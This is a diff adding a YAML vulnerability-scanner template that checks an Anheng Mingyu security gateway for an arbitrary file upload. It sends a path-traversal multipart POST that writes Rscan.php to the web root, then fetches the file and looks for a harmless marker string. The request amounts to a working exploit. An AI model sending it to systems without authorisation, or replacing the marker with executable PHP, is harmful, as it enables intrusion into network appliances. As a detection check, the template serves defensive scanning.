@@ -1,0 +1,18 @@
+name: 安恒-明御安全网关-web_preview-文件上传
+description: >-
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../Rscan.php
+    headers:
+      Content-Type: multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a
+    body: "--849978f98abe41119122148e4aa65b1a\r\nContent-Disposition: form-data; name=\"123\"; filename=\"Rscan.php\"\r\nContent-Type: text/plain\r\n\r\nRscan_test\r\n--849978f98abe41119122148e4aa65b1a--"
+    expression:
+      status: 200
+  - method: GET
+    path: /Rscan.php
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
